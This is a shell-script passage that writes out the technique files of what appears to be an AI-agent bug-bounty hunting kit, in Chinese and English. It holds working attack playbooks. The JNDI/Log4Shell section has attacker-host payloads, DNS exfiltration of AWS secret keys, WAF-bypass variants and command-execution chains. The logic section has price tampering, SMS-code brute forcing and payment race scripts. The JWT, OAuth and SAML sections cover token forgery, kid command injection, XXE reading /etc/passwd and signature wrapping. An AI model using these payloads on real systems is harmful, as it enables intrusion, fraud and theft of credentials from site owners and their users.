7. **已经进了 Git 产品网页**（不是扫 `/.git` 的阶段）：README / 议题当 HTML 渲、组员只填数字 ID、克隆列表不隔离 → 接到 `xss-test.md` §8 特权上下文，**不替代**上面的路径泄露探针。

---

## 6. 活的 Git 产品（和 §1 路径泄露并列，不互相取代）

`/.git/HEAD` 是仓库文件漏到公网。进了工蜂 / GitLab / 自研 Git 网页之后，面还在业务里：

- README、Wiki、议题、评论：按存储 XSS 打；有桌面客户端就再看它是不是把同一段 HTML 当特权页渲（`xss-test.md` §8）
- 加组员 / 邀请：顺序 `user_id` + 批量写（`idor-test.md` §4 / §8），不是新洞种
- 克隆 / 仓库列表不按人隔离：你的仓出现在对方客户端里，只是把上面那条 XSS 送过去

没前端、只摸到裸 `.git` → 仍走 §1～§5，别为了客户端空等。
TECH_INSECURE_SCM_TEST_EOF

seed_rule techniques/jndi-injection-test.md <<'TECH_JNDI_INJECTION_TEST_EOF'
# jndi-injection

# JNDI Injection


## 1. CORE MECHANISM

JNDI (Java Naming and Directory Interface) provides a unified API for looking up objects from naming/directory services (RMI, LDAP, DNS, CORBA).

**Vulnerability**: when `InitialContext.lookup(USER_INPUT)` receives an attacker-controlled URL, the JVM connects to the attacker's server and loads/executes arbitrary code.

```java
// Vulnerable code pattern:
String name = request.getParameter("resource");
Context ctx = new InitialContext();
Object obj = ctx.lookup(name);  // name = "ldap://attacker.com/Exploit"
```

---

## 2. ATTACK VECTORS

### RMI (Remote Method Invocation)

```
rmi://attacker.com:1099/Exploit
```

Attacker runs an RMI server returning a `Reference` object pointing to a remote class:
```java
// Attacker's RMI server returns:
Reference ref = new Reference("Exploit", "Exploit", "http://attacker.com/");
// JVM downloads http://attacker.com/Exploit.class and instantiates it
```

### LDAP

```
ldap://attacker.com:1389/cn=Exploit
```

Attacker runs an LDAP server returning entries with `javaCodeBase`, `javaFactory`, or serialized object attributes.

LDAP is preferred over RMI because LDAP restrictions were added later (JDK 8u191 vs 8u121 for RMI).

### DNS (detection only)

```
dns://attacker-dns-server/lookup-name
```

Useful for confirming JNDI injection without RCE — triggers DNS query to attacker's authoritative NS.

---

## 3. JDK VERSION CONSTRAINTS AND BYPASS

| JDK Version | RMI Remote Class | LDAP Remote Class | Bypass |
|---|---|---|---|
| < 8u121 | YES | YES | Direct class loading |
| 8u121 – 8u190 | NO (`trustURLCodebase=false`) | YES | Use LDAP vector |
| >= 8u191 | NO | NO | Return serialized gadget object via LDAP |
| >= 8u191 (alternative) | NO | NO | `BeanFactory` + EL injection |

### Post-8u191 Bypass: LDAP → Serialized Gadget

Instead of returning a remote class URL, the attacker's LDAP server returns a **serialized Java object** in the `javaSerializedData` attribute. The JVM deserializes it locally — if a gadget chain (e.g., CommonsCollections) is on the classpath, RCE is achieved.

```bash
# ysoserial JRMPListener approach:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"
# Then JNDI lookup points to: rmi://attacker:1099/whatever
```

### Post-8u191 Bypass: BeanFactory + EL

When Tomcat's `BeanFactory` is on the classpath, the LDAP response can reference it as a factory with EL expressions:

```
javaClassName: javax.el.ELProcessor
javaFactory: org.apache.naming.factory.BeanFactory
forceString: x=eval
x: Runtime.getRuntime().exec("id")
```

---

## 4. TOOLING

### marshalsec — JNDI Reference Server

```bash
# Start LDAP server serving a remote class:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389

# Start RMI server:
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker.com/#Exploit" 1099

# The #Exploit refers to Exploit.class hosted at http://attacker.com/Exploit.class
```

### JNDI-Injection-Exploit (all-in-one)

```bash
java -jar JNDI-Injection-Exploit.jar -C "command" -A attacker_ip
# Automatically starts RMI + LDAP servers with multiple bypass strategies
```

### Rogue JNDI

```bash
java -jar RogueJndi.jar --command "id" --hostname attacker.com
# Provides RMI, LDAP, and HTTP servers with auto-generated payloads
```

---

## 5. LOG4J2 — CVE-2021-44228 (LOG4SHELL)

### Mechanism

Log4j2 supports **Lookups** — expressions like `${...}` that are evaluated in log messages. The `jndi` lookup triggers `InitialContext.lookup()`:

```
${jndi:ldap://attacker.com/x}
```

**Any logged string** containing this pattern triggers the vulnerability — User-Agent, form fields, HTTP headers, URL paths, error messages.

### Detection Payloads

```text
${jndi:ldap://TOKEN.collab.net/a}
${jndi:dns://TOKEN.collab.net}
${jndi:rmi://TOKEN.collab.net/a}

# Exfiltrate environment info via DNS:
${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.TOKEN.collab.net}
${jndi:ldap://${hostName}.TOKEN.collab.net}
```

### WAF Bypass Variants

Log4j2's lookup parser is very flexible:

```text
${${lower:j}ndi:ldap://attacker.com/x}
${${upper:j}${upper:n}${upper:d}i:ldap://attacker.com/x}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/x}
${j${::-n}di:ldap://attacker.com/x}
${jndi:l${lower:D}ap://attacker.com/x}
${${env:NaN:-j}ndi${env:NaN:-:}ldap://attacker.com/x}
```

### Split-Log Bypass (Advanced)

When WAF detects paired `${jndi:...}` in a single request, split across two log entries:

```text
# Request 1 (logged first):
X-Custom: ${jndi:ldap://attacker.com/
# Request 2 (logged second):
X-Custom: exploit}
```

If the application concatenates log entries before re-processing (e.g., aggregation pipelines), the combined `${jndi:ldap://attacker.com/exploit}` triggers.

### Real-World Case: Solr Log4Shell

```bash
# Confirm via DNSLog — Solr admin cores API:
GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.TOKEN.dnslog.cn}
# DNS hit with Java version = confirmed Log4Shell in Solr
```

### Injection Points to Test

```text
User-Agent          X-Forwarded-For       Referer
Accept-Language     X-Api-Version         Authorization
Cookie values       URL path segments     POST body fields
Search queries      File upload names     Form field names
GraphQL variables   SOAP/XML elements     JSON values
```

### Affected Versions

- Log4j2 2.0-beta9 through 2.14.1
- Fixed in 2.15.0 (partial), fully fixed in 2.17.0
- Log4j 1.x is NOT affected (different lookup mechanism)

---

## 6. OTHER JNDI SINKS (BEYOND LOG4J)

| Product / Framework | Sink |
|---|---|
| Spring Framework | `JndiTemplate.lookup()` |
| Apache Solr | Config API, VelocityResponseWriter |
| Apache Druid | Various config endpoints |
| VMware vCenter | Multiple endpoints |
| H2 Database Console | JNDI connection string |
| Fastjson | `@type` + `JdbcRowSetImpl.setDataSourceName()` |

### H2 Console：JDBC URL / CREATE ALIAS

认：Spring Boot 或管理台出现 `/h2-console`；登录表能填 JDBC URL；`web-allow-others` 开了（外网能打开）。**没看到这个页不要找。**

打：

1. JDBC URL 填 `ldap://协作域/Exploit` 或 `javax.naming.InitialContext`（BeanFactory + EL，JDK ≥ 8u191 常用）。LDAP 侧用上面 §3 的 `javaClassName=javax.el.ELProcessor` + `BeanFactory`。
2. 能进 SQL 页再打：

```sql
CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd); return "ok"; }';
CALL EXEC('id');
```

算成：命令跑起来（DNS 打到 JNDI 只算确认 lookup，还要跟到 exec 或 gadget）。只打开了控制台、连不上库 → 没成。

假点：只本机 `localhost` 能开；JDBC URL 写死、改不了；`CREATE ALIAS` 被禁。这枪偏窄，**不进短表**；见了再打开本段。

---

## 7. TESTING METHODOLOGY

```
Suspected JNDI injection point?
├── Send DNS-only probe: ${jndi:dns://TOKEN.collab.net}
│   └── DNS hit? → Confirmed JNDI evaluation
│
├── Determine JDK version:
│   └── ${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
│
├── JDK < 8u191?
│   ├── Start marshalsec LDAP server with remote class
│   └── ${jndi:ldap://attacker:1389/Exploit} → direct RCE
│
├── JDK >= 8u191?
│   ├── LDAP → serialized gadget (need gadget chain on classpath)
│   ├── BeanFactory + EL (need Tomcat on classpath)
│   └── JRMPListener via ysoserial
│
└── WAF blocking ${jndi:...}?
    └── Try obfuscation: ${${lower:j}ndi:...}
```

---

## 8. QUICK REFERENCE

```text
# Safe confirmation (DNS only):
${jndi:dns://TOKEN.collab.net}

# LDAP RCE (JDK < 8u191):
${jndi:ldap://ATTACKER:1389/Exploit}

# Version exfiltration:
${jndi:ldap://${sys:java.version}.TOKEN.collab.net}

# Log4Shell with WAF bypass:
${${lower:j}ndi:${lower:l}dap://ATTACKER/x}

# Start LDAP reference server:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER/#Exploit" 1389

# Post-8u191 — ysoserial JRMP:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"
```
TECH_JNDI_INJECTION_TEST_EOF

seed_rule techniques/js-reverse-guide.md <<'TECH_JS_REVERSE_GUIDE_EOF'
# JS 逆向配合接口挖掘指南

> 进站强制步骤见 `rules/srcskill/dig-scope-workflow.md` §4.1：**不只抽 `/api/` path**。盐、密文 id 公钥、hidden/admin 路由、写死的演示号有就进清单，没有写「无」。演示号当钥匙，不是登录框字典。

## 使用场景

- 页面接口有加密参数，无法直接用 curl 重放
- 需要从前端 JS 发现隐藏 API 接口
- 需要了解签名/token 生成逻辑以构造任意请求
- 路由表里 hidden/admin、webpack 异步 chunk、写死演示号/测试租户

---

## 流程一：接口发现

### 1. 查看网络请求

使用 js-reverse MCP 工具（浏览器已打开目标页面时）：

```
操作: list_network_requests()
筛选: resourceTypes=["xhr", "fetch"]
关注: 含用户数据的接口（/user/, /api/, /order/, /account/）
```

### 2. 从 JS 源码批量提取接口

```javascript
// 在 evaluate_script 中执行，提取页面所有 XHR 路径
() => {
  const scripts = Array.from(document.querySelectorAll('script[src]'))
    .map(s => s.src);
  return scripts;
}
```

```bash
# 下载所有 JS 文件，grep 接口路径
for url in $(cat js_files.txt); do
  curl -s "$url" | grep -oP '"(/api/[^"]+)"' | tr -d '"'
done | sort -u > discovered_apis.txt

# 关键词搜索
grep -E "(userId|uid|token|sign|order|payment)" discovered_apis.txt
```

### 3. 使用 search_in_sources 搜索

```
search_in_sources("userId")          // 找用户ID相关接口
search_in_sources("/api/")           // 找所有 API 路径
search_in_sources("Authorization")   // 找 token 设置位置
search_in_sources("signature")       // 找签名参数
```

---

## 流程二：加密参数分析

适用于请求中有 `sign`/`_token`/`x-sign` 等加密参数。

### Step 1: XHR 断点定位

```
1. break_on_xhr("/api/target-endpoint")
2. 在页面触发对应操作
3. 执行暂停后: get_paused_info()
4. 查看调用栈，找到设置加密参数的函数
```

### Step 2: 分析调用栈

```
get_paused_info() 返回示例:
  Frame 0: setRequestHeader (XMLHttpRequest)
  Frame 1: signRequest (utils.js:342)     ← 关注这里
  Frame 2: sendApiRequest (api.js:89)
  Frame 3: onClick (page.js:234)
```

定位到 Frame 1，读取源码：

```
get_script_source(url="utils.js", startLine=335, endLine=355)
```

### Step 3: 提取签名逻辑

常见签名算法模式：

```javascript
// 模式 1: 参数排序 + MD5
function signRequest(params) {
  const sorted = Object.keys(params).sort().map(k => `${k}=${params[k]}`).join('&');
  return md5(sorted + SECRET_KEY);
}

// 模式 2: timestamp + nonce + HMAC
function sign(data) {
  const ts = Date.now();
  const nonce = Math.random().toString(36).substr(2);
  return hmacSha256(ts + nonce + JSON.stringify(data), APP_SECRET);
}

// 模式 3: 固定 salt 拼接
const sign = md5(userId + ':' + timestamp + ':' + SALT);
```

### Step 4: 在浏览器中执行签名函数

```javascript
// evaluate_script 直接调用页面内的签名函数
() => {
  // 如果函数在全局作用域
  return window.signRequest({userId: "victim_id", action: "getInfo"});
}
```

### Step 5: Python 复现签名

```python
import hashlib
import hmac
import time
import random
import string

# MD5 签名复现
def sign_request(params: dict, secret_key: str) -> str:
    sorted_str = '&'.join(f"{k}={params[k]}" for k in sorted(params.keys()))
    return hashlib.md5((sorted_str + secret_key).encode()).hexdigest()

# HMAC-SHA256 签名复现
def sign_hmac(data: str, app_secret: str) -> str:
    ts = str(int(time.time() * 1000))
    nonce = ''.join(random.choices(string.ascii_lowercase, k=8))
    msg = ts + nonce + data
    return hmac.new(app_secret.encode(), msg.encode(), hashlib.sha256).hexdigest()

# 验证：Python 结果应与浏览器 JS 执行结果一致
```

---

## 流程三：隐藏接口发现

### 从 Webpack chunk 中提取

```bash
# 找 chunk 文件
curl -s "https://target.com" | grep -oP 'chunk\.[a-z0-9]+\.js'

# 下载所有 chunk
for chunk in $(curl -s "https://target.com" | grep -oP '"/static/js/[^"]+\.js"' | tr -d '"'); do
  curl -s "https://target.com$chunk" >> all_js.txt
done

# 提取路径
grep -oP '"(/[a-z]+){1,5}"' all_js.txt | sort -u | grep -v node_modules
```

### 从路由配置提取

```bash
# Vue/React 路由配置
grep -oP 'path:\s*["\x27][^"'\'']+' all_js.txt
grep -oP '"route":\s*["\x27][^"'\'']+' all_js.txt

# Axios 基础 URL
grep -oP 'baseURL:\s*["\x27][^"'\'']+' all_js.txt
grep -oP 'BASE_API\s*=\s*["\x27][^"'\'']+' all_js.txt
```

---

## 流程四：API 参数枚举

发现接口后，枚举参数找越权/注入点：

```python
import requests

# 对发现的接口逐个测试
discovered_apis = [
    "/api/v1/user/info",
    "/api/v1/order/list",
    "/api/v2/account/profile",
]

session = requests.Session()
session.headers.update({"Authorization": "Bearer YOUR_TOKEN"})

for api in discovered_apis:
    r = session.get(f"https://target.com{api}")
    print(f"[{r.status_code}] {api} - {len(r.text)} bytes")
    if r.status_code == 200:
        # 记录响应中的 ID 字段，用于后续越权测试
        data = r.json()
        print(f"  响应字段: {list(data.keys()) if isinstance(data, dict) else 'array'}")
```
TECH_JS_REVERSE_GUIDE_EOF

seed_rule techniques/llm-security-test.md <<'TECH_LLM_SECURITY_TEST_EOF'
# llm-security-test（禁开越狱教材）

> **SRC 开场勿开本篇。** 只越狱聊天、没有工具/数据/SSRF 闭环 → 默认不写。对话口工具真执行见 `agent-tool-exec-test.md`。未授权读助手历史见 `idor-test.md`「助手历史未授权读他人任务」。
TECH_LLM_SECURITY_TEST_EOF

seed_rule techniques/logic-test.md <<'TECH_LOGIC_TEST_EOF'
> 写不写只认 `rules/srcskill/vuln-report-format.md`。进站有会话时最低探针见 `rules/srcskill/dig-scope-workflow.md` §4.2.3（加字段、跳步、领取/库存/券并发一枪）。本篇是测法：支付/流程/验证码都测；发码/滑块没进号就转认证链，别停半截。
> 短表「商家促销绑定」在 §1.4。英文 business-logic / CHECKLIST / METHODOLOGY / SCENARIOS 附件已砍；支付/流程/验证码测法仍在上半。

---

## 一、原有知识库

# 逻辑漏洞测试手册

## 一、支付逻辑漏洞

### 1.1 价格篡改

```bash
# 在购物车提交时，修改商品单价
# 抓取订单提交请求，修改 price 字段
POST /api/order/create
{"goodsId": "123", "count": 1, "price": "0.01"}  # 原价改为 0.01

# 负数价格（余额增加）
{"goodsId": "123", "count": 1, "price": "-100"}
```

### 1.2 数量篡改

```bash
# 购买 1 件但请求中修改为 -1（可能退款）
{"goodsId": "123", "count": -1, "price": "99.00"}

# 整数溢出（32位最大值）
{"count": 2147483647}
```

### 1.3 优惠券/积分漏洞

```bash
# 重复使用同一优惠券
# 并发竞争（多线程同时提交同一优惠券）
for i in $(seq 1 20); do
  curl -X POST "https://target.com/api/coupon/use" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"couponId": "COUPON123"}' &
done
wait

# 负数积分（积分兑换时设负数）
{"points": -1000}  # 期望余额增加
```

### 1.4 商家促销绑定：券挂到别人的货（短表有指针）

> 本质：商家后台「把我的促销/券绑到某件货」只信请求里的 `productId`，不查这件货是不是本店的。  
> 和结账改价、改券面值、结账换便宜 SKU **不是一条**。短表一行指向本节。

**认：** 有商家/供应商后台；能建满减、无门槛券、促销；绑货接口名常带 `relate` / `bind` / `attach` / `apply` + `promo` / `salespromotion` / `coupon`；body 里同时有券/活动 ID 和 `productId` / `skuId` / `goodsId`。

**打：**

1. 用本店号建一张规则狠的券（无门槛、面值够大、不限本店品类更好）  
2. 正常绑一次自己的货，抓住绑定请求  
3. **只改** `productId`（或同义字段）成别人店、别的品类的货；券 ID / 活动 ID 不动  
4. 不登录打开 C 端那件货的详情/下单页，看标价和应付  

**算成：** C 端别人那件货的应付价按你这张券掉下来（能下单更好）。只证明绑定接口 200、商家后台列表多了一行 → 不算，必须 C 端价真变。

**假点：** 绑定成功但 C 端价/结算不变；后端按商家会话重写商品、只绑得动自己的货；改的是 C 端结账包里的 `productId` 换成更便宜的 SKU（那是清单里已有的「结账换货」，不是本条）。

和邻近手法别混：

| 本条 | 别当成 |
|------|--------|
| B 端绑券接口，改的是「绑到哪件货」 | C 端结账改 `amount` / `coupon_amount` |
| 自己的券 + 别人的 `productId` | 结账把 `productId` 换成更便宜的 SKU 再付钱 |
| 要看到 C 端价掉下来 | 商家后台列表显示绑成功就算 |

开场半分钟：有商家后台就建券 → 抓绑定包 → 换一个明显不是本店的 `productId` → 打开 C 端看价。

---

## 二、验证码/短信漏洞

> 测到接管/越权闭环（码回显+登录、万能码+登录、爆破+改密）才算打穿。只触发发送/滑块过了/能试密没进号 → 转认证链，别停半截。

### 2.1 验证码可枚举

```python
import requests

# 4位数字验证码 - 逐一尝试
for code in range(0, 10000):
    r = requests.post("https://target.com/api/verify",
        json={"phone": "13800138000", "code": f"{code:04d}"})
    if r.json().get("code") == 0:
        print(f"正确验证码: {code:04d}")
        break

# 验证: 是否有频率限制（前20次无限制 → 没进号继续跟认证链）
```

### 2.2 万能验证码

```
测试以下验证码:
000000, 123456, 888888, 666666
111111, 999999
空值: ""
不发验证码直接提交
```

### 2.3 短信轰炸（内部略测限频，别停半截）

> 只证明能发码不算打穿。下面技术点防把轰炸接口当主洞。

```python
# 测试是否有发送频率限制（仅测试1-2次，不实际轰炸）
# 验证:
# 1. 同号码连续发送间隔是否有限制
# 2. IP 限制是否存在
# 3. 修改 phone 参数但仍发送到固定号码
{"phone": "目标手机号", "realPhone": "13800138000"}
```

---

## 三、竞争条件（Race Condition）

### 3.1 并发扣减

```python
import threading
import requests

# 余额 100，同时发起 10 次 100 元消费
def consume():
    r = requests.post("https://target.com/api/pay",
        headers={"Authorization": f"Bearer {TOKEN}"},
        json={"amount": 100})
    print(r.json())

threads = [threading.Thread(target=consume) for _ in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]
```

### 3.2 重复提交

```bash
# 订单重复提交（同一请求发多次）
for i in $(seq 1 10); do
  curl -X POST "https://target.com/api/order/pay" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"orderId": "ORDER123", "amount": "0.01"}' &
done
```

---

## 四、账号安全漏洞

### 4.1 账号枚举

```bash
# 注册/登录接口区分"用户不存在"和"密码错误"
# 如果响应不同 → 可枚举账号

# 注册时检测手机号是否已注册
curl "https://target.com/api/register/check?phone=13800138000"
# 响应 {"exists": true} → 可枚举
```

### 4.2 密码找回逻辑

```
测试流程:
1. 发起找回密码（手机 A）
2. 获取到 token/链接
3. 修改请求中的 phone 为手机 B
4. 如果成功修改 B 的密码 → 任意账号密码重置
```

### 4.3 接管漏洞

```
场景: 手机注销后重新分配给他人
1. 用已注销号码注册
2. 尝试登录原绑定账号
3. 或: 修改绑定手机号时验证码发送到旧号
```

---

## 五、业务逻辑绕过

### 5.1 状态机绕过

```bash
# 正常流程: 步骤1 → 步骤2 → 步骤3 → 完成
# 尝试跳过步骤2直接执行步骤3
# 或者回退到步骤1但保留步骤3的结果

# 记录每步的请求，逐一重放，观察能否越过校验
```

### 5.2 测试用参数

```
在请求中添加：
debug=true / test=1 / internal=1
is_admin=true / role=admin
from_internal=1 / bypass_check=1
```

---
TECH_LOGIC_TEST_EOF

seed_rule techniques/oauth-jwt-test.md <<'TECH_OAUTH_JWT_TEST_EOF'
> 结构：上半原有是主线（JWT / OAuth / SAML）；下半补充按 api-auth / jwt-oauth / oidc / saml 加深。标题搜即可。
>
> 跨域读 token：SRC 不挖 CORS，**勿开** `cors-test.md`。有跨站写走 `csrf-test.md`，有越权读走 `idor-test.md`。

## 一、原有知识库

# OAuth/JWT/SAML 安全测试手册

## 一、JWT 测试

### 1.1 算法混淆攻击

```python
import jwt
import base64

# 原始 JWT
token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature"

# 攻击 1: alg=none（去除签名）
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin"}
fake_token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=') + '.' + \
             base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=') + '.'

# 攻击 2: RS256 → HS256（用公钥作为 HMAC 密钥）
# 1. 获取公钥（从 /jwks.json 或证书）
# 2. 用公钥作为 HS256 的密钥签名
public_key = open('public.pem', 'rb').read()
fake_token = jwt.encode({"user": "admin"}, public_key, algorithm='HS256')
```

### 1.2 密钥爆破

```bash
# jwt_tool 爆破
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# hashcat 爆破
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# John the Ripper
john --wordlist=wordlist.txt --format=HMAC-SHA256 jwt.txt
```

### 1.3 kid 注入

```python
# kid (Key ID) 参数可能存在注入
# SQL 注入
header = {
    "alg": "HS256",
    "kid": "1' UNION SELECT 'secret'--"
}

# 路径遍历
header = {
    "alg": "HS256",
    "kid": "../../../../../../dev/null"  # 空文件作为密钥
}

# 命令注入
header = {
    "alg": "HS256",
    "kid": "key.txt; whoami"
}
```

### 1.4 jku/x5u 头部篡改

```python
# jku: JWK Set URL（指向攻击者服务器）
header = {
    "alg": "RS256",
    "jku": "https://attacker.com/jwks.json",
    "kid": "attacker-key"
}

# 攻击者服务器上的 jwks.json
{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key",
      "use": "sig",
      "n": "...",  # 攻击者的公钥
      "e": "AQAB"
    }
  ]
}

# 用攻击者私钥签名 JWT
```

### 1.5 exp 过期时间篡改

```python
import jwt
import time

# 修改 exp 为未来时间
payload = {
    "user": "admin",
    "exp": int(time.time()) + 86400 * 365  # 1年后过期
}

# 如果服务端不验证签名，直接修改 payload
```

### 1.6 签名剥离

```bash
# 去除签名部分，只保留 header.payload.
# 部分实现可能不检查签名是否存在

# 原始: eyJhbGci...header.eyJ1c2Vy...payload.c2lnbmF0dXJl...signature
# 修改: eyJhbGci...header.eyJ1c2Vy...payload.
```

---

## 二、OAuth 2.0 测试

### 2.1 redirect_uri 绕过

```bash
# 原始授权 URL
https://oauth.target.com/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://target.com/callback&
  response_type=code&
  scope=read

# 绕过方法 1: 子目录
redirect_uri=https://target.com/callback/../../attacker.com

# 绕过方法 2: 子域名
redirect_uri=https://attacker.target.com/callback

# 绕过方法 3: 参数污染
redirect_uri=https://target.com/callback?next=https://attacker.com

# 绕过方法 4: 开放重定向链
redirect_uri=https://target.com/redirect?url=https://attacker.com

# 绕过方法 5: 域名混淆
redirect_uri=https://target.com.attacker.com
redirect_uri=https://target.com@attacker.com
redirect_uri=https://target.com%2eattacker.com

# 绕过方法 6: 协议混淆
redirect_uri=javascript:alert(document.domain)
redirect_uri=data:text/html,<script>alert(1)</script>
```

### 2.2 state 参数测试

```bash
# 测试 1: state 参数缺失
# 去掉 state 参数，观察是否仍能完成授权 → CSRF 风险

# 测试 2: state 可预测
# 多次授权，观察 state 是否有规律（递增、时间戳等）

# 测试 3: state 重放
# 使用已用过的 state 再次授权
```

### 2.3 授权码重放

```bash
# 1. 完成一次授权，获取 code
# 2. 用 code 换取 access_token
# 3. 再次用同一 code 换取 token
# 如果成功 → 授权码可重放

curl -X POST "https://oauth.target.com/token" \
  -d "grant_type=authorization_code" \
  -d "code=USED_CODE" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \
  -d "redirect_uri=https://target.com/callback"
```

### 2.4 scope 提升

```bash
# 请求时 scope=read
# 授权后修改 code 换 token 时的 scope

curl -X POST "https://oauth.target.com/token" \
  -d "grant_type=authorization_code" \
  -d "code=AUTH_CODE" \
  -d "client_id=CLIENT_ID" \
  -d "client_secret=CLIENT_SECRET" \
  -d "redirect_uri=https://target.com/callback" \
  -d "scope=read write admin"  # 提升权限
```

### 2.5 隐式授权流 token 泄露

```bash
# Implicit Flow 直接在 URL fragment 返回 token
https://target.com/callback#access_token=TOKEN&token_type=Bearer

# 风险:
# 1. Referer 泄露（访问外部链接时）
# 2. 浏览器历史记录
# 3. 日志记录

# 测试: 在回调页面插入外部资源
<img src="https://attacker.com/log">
# 检查 attacker.com 日志是否收到 Referer 含 token
```

### 2.6 PKCE 缺失测试

```bash
# PKCE (Proof Key for Code Exchange) 用于防止授权码拦截

# 测试: 不发送 code_challenge 和 code_verifier
# 1. 授权时不带 code_challenge
# 2. 换 token 时不带 code_verifier
# 如果仍能成功 → 未强制 PKCE
```

### 2.7 client_secret 泄露

```bash
# 检查 JS 源码
grep -r "client_secret" *.js
grep -r "clientSecret" *.js

# 检查移动端 APK
apktool d app.apk
grep -r "client_secret" app/

# 检查 Git 历史
git log -p | grep -i "client_secret"
```

---

## 三、SAML 测试

### 3.1 签名绕过（XML 签名包装攻击）

```xml
<!-- 原始 SAML Response -->
<samlp:Response>
  <Assertion ID="original">
    <Subject>
      <NameID>victim@example.com</NameID>
    </Subject>
    <Signature>...</Signature>
  </Assertion>
</samlp:Response>

<!-- 攻击: 插入恶意 Assertion -->
<samlp:Response>
  <Assertion ID="evil">
    <Subject>
      <NameID>attacker@example.com</NameID>
    </Subject>
  </Assertion>
  <Assertion ID="original">
    <Subject>
      <NameID>victim@example.com</NameID>
    </Subject>
    <Signature>...</Signature>
  </Assertion>
</samlp:Response>

<!-- 如果应用读取第一个 Assertion 但验证第二个签名 → 绕过 -->
```

### 3.2 断言篡改

```xml
<!-- 修改 NameID -->
<NameID>admin@example.com</NameID>

<!-- 修改属性 -->
<Attribute Name="role">
  <AttributeValue>admin</AttributeValue>
</Attribute>

<!-- 修改过期时间 -->
<Conditions NotBefore="2020-01-01" NotOnOrAfter="2030-01-01">
```

### 3.3 XXE 注入

```xml
<!-- SAML 请求中注入 XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:AuthnRequest>
  <Issuer>&xxe;</Issuer>
</samlp:AuthnRequest>
```

### 3.4 注释注入截断

```xml
<!-- 利用 XML 注释截断签名验证 -->
<NameID>victim@example.com<!--</NameID>
<NameID>attacker@example.com</NameID>-->
```

---

## 四、测试工具

### jwt_tool

```bash
# 安装
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 jwt_tool.py -h

# 扫描所有漏洞
python3 jwt_tool.py <JWT> -M at

# 爆破密钥
python3 jwt_tool.py <JWT> -C -d wordlist.txt

# 篡改 payload
python3 jwt_tool.py <JWT> -T
```

### Burp 插件

```
- JSON Web Tokens (JWT4B)
- SAML Raider
- OAuth Scanner
```

### Python 脚本示例

```python
import requests
import jwt

# JWT 测试
def test_jwt_none_alg(token):
    """测试 alg=none 攻击"""
    header, payload, sig = token.split('.')
    
    # 解码 payload
    import base64, json
    payload_data = json.loads(base64.urlsafe_b64decode(payload + '=='))
    
    # 构造 alg=none token
    new_header = base64.urlsafe_b64encode(
        json.dumps({"alg": "none", "typ": "JWT"}).encode()
    ).decode().rstrip('=')
    new_payload = base64.urlsafe_b64encode(
        json.dumps(payload_data).encode()
    ).decode().rstrip('=')
    
    fake_token = f"{new_header}.{new_payload}."
    
    # 测试
    r = requests.get("https://target.com/api/me",
                     headers={"Authorization": f"Bearer {fake_token}"})
    return r.status_code == 200

# OAuth redirect_uri 测试
def test_redirect_uri_bypass(auth_url, payloads):
    """测试 redirect_uri 绕过"""
    for payload in payloads:
        test_url = auth_url.replace(
            "redirect_uri=https://target.com/callback",
            f"redirect_uri={payload}"
        )
        print(f"测试: {payload}")
        # 手动访问 test_url 观察是否跳转到攻击者域名
```

---

## 二、补充：api-auth-and-jwt-abuse

### api-auth-and-jwt-abuse

### API Auth and JWT Abuse — Token Trust, Header Tricks, and Rate Limits

## 1. TOKEN TRIAGE

Inspect:

- `alg`, `kid`, `jku`, `x5u`
- role, org, tenant, scope, or privilege claims
- issuer and audience mismatches
- reuse of mobile and web tokens across products

## 2. QUICK ATTACK PICKS

| Pattern | First Test |
|---|---|
| `alg:none` acceptance | unsigned token with trailing dot |
| RS256 confusion | switch to HS256 using public key as secret |
| `kid` lookup trust | path traversal or injection in `kid` |
| remote key fetch trust | attacker-controlled `jku` or `x5u` |
| weak secret | offline crack with targeted wordlists |

## 3. HIDDEN FIELDS AND BATCH ABUSE

### Mass assignment field picks

```text
role
isAdmin
admin
verified
plan
tier
permissions
org
owner
```

### Rate limit and batch abuse picks

```text
X-Forwarded-For: 1.2.3.4
X-Real-IP: 5.6.7.8
Forwarded: for=9.9.9.9
```

GraphQL or JSON batch abuse candidates:

- arrays of login mutations
- bulk object fetches with varying IDs
- repeated password reset or verification calls in one request

## 4. RATE LIMIT BYPASS FAMILIES

```text
X-Forwarded-For
X-Real-IP
Forwarded
User-Agent rotation
Path case / slash variants
```

## 5. NEXT ROUTING

- For GraphQL batching and hidden parameters: [graphql and hidden parameters](graphql-test.md)
- For default credential and brute-force planning: [authentication bypass](authbypass-test.md)
- For full JWT and OAuth depth: [jwt oauth token attacks](oauth-jwt-test.md)
- For OAuth or OIDC configuration flaws in browser and SSO flows: [oauth oidc misconfiguration](oauth-jwt-test.md)
- 跨域读 token：SRC 不挖 CORS，**勿开** `cors-test.md`。有跨站写走 `csrf-test.md`，有越权读走 `idor-test.md`

---

## 补充：jwt-oauth-token-attacks

### jwt-oauth-token-attacks

### JWT and OAuth 2.0 Token Attacks


## 1. JWT ANATOMY

```
